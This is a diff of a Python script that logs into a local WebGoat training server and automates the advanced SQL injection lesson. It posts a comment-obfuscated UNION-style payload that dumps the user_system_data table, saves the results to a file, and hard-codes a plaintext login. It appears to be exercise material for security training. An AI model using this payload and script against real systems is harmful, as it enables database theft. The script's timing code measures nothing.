@@ -1,52 +1,72 @@
 import requests
-from requests import session
+from datetime import datetime
 
-# Define the base URL and login URL
+# Step 1: Import the "requests" module to handle HTTP requests.
+# Do NOT use the BeautifulSoup (bs4) library or dict_from_cookiejar from requests.utils library.
+
+# Step 2: Define the base URL and login URL.
 base_url = 'http://127.0.0.1:8080/WebGoat/'
 login_url = f'{base_url}login'
 vulnerable_url = f'{base_url}SqlInjectionAdvanced/attack6a'
 session_url = f'{base_url}SqlInjectionAdvanced.lesson.lesson'
 
-# Create a session to persist cookies across requests
-with session() as s:
-    # Retrieve the login page content
-    response = s.get(login_url)
+# Step 3: Create a session to persist cookies across requests.
+with requests.Session() as session:
+    # Step 4: Retrieve the login page content.
+    response = session.get(login_url)
     
-    # Define the user credentials
+    # Step 5: Define the user credentials.
     username = 'sbombatkar'
     password = 'Sneha#1234'
     
-    # Submit the login details to authenticate
-    login_data = {
+    # Step 6: Submit the login details to authenticate. allow_redirects=True MUST be there.
+    data = {
         'username': username,
         'password': password
     }
-    response = s.post(login_url, data=login_data, allow_redirects=True)
+    response = session.post(login_url, data=data, allow_redirects=True)
     
-    # Check if the login is successful
-    if "Invalid username and password" not in response.text:
+    # Step 7: Check if the login is successful.
+    if "Invalid username and password" not in response.text and response.status_code == 200:
         print("Login successful!")
         
-        # Access the lesson page to set up the attack
-        lesson_page = s.get(session_url)
+        # Step 8: Access the lesson page to set up the attack.
+        lesson_page = session.get(session_url)
         
-        # Create a payload for the SQL injection attack
+        # Step 9: Create a payload for the SQL injection attack.
+        payload = "cyber';/**/select/**/*/**/from/**/user_system_data;--"
+        
+        # Step 10: Define the dictionary with the payload.
         attack_data = {
-            'userid_6a': "cyber';/**/select/**/*/**/from/**/user_system_data;--"
+            'userid_6a': payload
         }
         
-        # Perform the SQL injection attack
-        response = s.post(vulnerable_url, data=attack_data)
+        # Step 11: Perform the SQL injection attack.
+        response = session.post(vulnerable_url, data=attack_data)
         
-        # Check if the attack was successful
+        # Step 12: Check if the attack was successful by looking for specific keywords in the response.
         response_data = response.json()
         if "lessonCompleted" in response_data and response_data["lessonCompleted"]:
             feedback = response_data["feedback"]
             output = response_data["output"]
             
-            print(f"Feedback: {feedback}")
-            print(f"Output: {output}")
-        else:
-            print("Attack failed.")
+            # Step 14: Print the feedback and output, indicating the attack was successful.
+            print(f'Feedback: {feedback}')
+            print(f'Output: {output}')
+            
+            # Step 15: Save the feedback and output into a file called "extracts.txt".
+            with open('extracts.txt', 'w') as f:
+                f.write(f"Feedback: {feedback}\n")
+                f.write(f"Output: {output}")
+            
+        # Step 16: Close the session to end the interaction with the server.
     else:
-        print("Login failed. Please check your credentials and try again.")
+        print("Login failed!")
+
+# Log the start and end time of the script execution.
+start_time = datetime.now()
+print(f"Start Time: {start_time}")
+end_time = datetime.now()
+total_time = end_time - start_time
+print(f"End Time: {end_time}")
+print(f"Total Execution Time: {total_time}")
